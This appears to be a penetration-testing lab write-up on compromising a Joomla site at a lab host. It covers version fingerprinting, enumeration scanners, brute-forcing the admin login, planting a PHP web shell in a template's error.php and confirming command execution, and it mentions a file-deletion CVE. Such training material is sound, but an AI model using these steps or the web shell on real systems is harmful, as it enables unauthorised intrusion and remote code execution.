Written in PHP and uses MySQL in the backend.
# Footprinting
We can look at the source code for the word `joomla` :
```bash
curl -s http://dev.inlanefreight.local/ | grep Joomla

	<meta name="generator" content="Joomla! - Open Source Content Management" />

<SNIP>
```
Or in the `robots.txt` file if present, it may look like this :
```bash
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# <https://www.robotstxt.org/orig.html>

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
<SNIP>
```
We can also look for the telltale Joomla favicon (not always), and we can grep the version if the `README.txt` file is present :
```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5

1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: <https://www.joomla.org>
	* Joomla! 3.9 version history - <https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history>
	* Detailed changes in the Changelog: <https://github.com/joomla/joomla-cms/commits/staging>
```
In certain Joomla installs, we may be able to fingerprint the version from JavaScript files in the `media/system/js/` directory or by browsing to `administrator/manifests/files/joomla.xml` :
```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>
  
 <SNIP>
```
The `cache.xml` file can help to give us the approximate version. It is located at `plugins/system/cache/cache.xml`.
# Enumeration
Let's try out [droopescan](https://github.com/droope/droopescan), a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
```bash
sudo pip3 install droopescan
```
Lets run a scan :
```bash
droopescan scan joomla --url http://dev.inlanefreight.local/
```
As we can see, it did not turn up much information aside from the possible version number. We can also try out [JoomlaScan](https://github.com/drego85/JoomlaScan), which is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool. `JoomlaScan` is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed.
```bash
sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4
```
Let’s run a scan :
```bash
python2.7 joomlascan.py -u http://dev.inlanefreight.local
```
The tool may help us finding accessible directories and files, fingerprinting the insallation. The default administrator account on Joomla installs is `admin`, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this [script](https://github.com/ajnik/joomla-bruteforce) to attempt to brute force the login :
```bash
sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```
Now we have an access to the installation !
# Attacking Joomla
Let’s say we have found an access to a Joomla e-commerce site. Like Wordpress or Drupal, Joomla can aim to gain remote code execution if we can log in to the admin backend.
### Abusing Bult-In Functionality
Using the found credentials `admin:admin`, let us log in to the target backend at `http://dev.inlanefreight.local/administrator`. Once logged in, we can see many options available to us. We would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.
![[joomla_admin.webp]]
From here, we can click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
![[joomla_templates.webp]]
We can click on a template name. Let's choose `protostar` under the `Template` column header. This will bring us to the `Templates: Customise` page.
![[joomla_customise.webp]]
We can click on a page to pull up the page source. Let's choose the `error.php` page. We'll add a PHP one-liner to gain code execution. It’s a good practice to use non-standard file names and parameters for our web shells to not make them easily accessible to a "drive-by" attacker during the assessment.
```bash
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```
![[joomla_edited.webp]]
Once this is set, we can click on `Save & Close` at the top and confirm code execution using `cURL` :
```bash
curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network.
### Leveraging Known Vulnerabilities
There are a lot of Joomla-related vulnerabilities that received CVEs. Let's dig into a Joomla core vulnerability that affects version `3.9.4`, which our target `http://dev.inlanefreight.local/` was found to be running during our enumeration. Researching a bit, we find that this version of Joomla is likely vulnerable to [CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945) which is a directory traversal and authenticated file deletion vulnerability.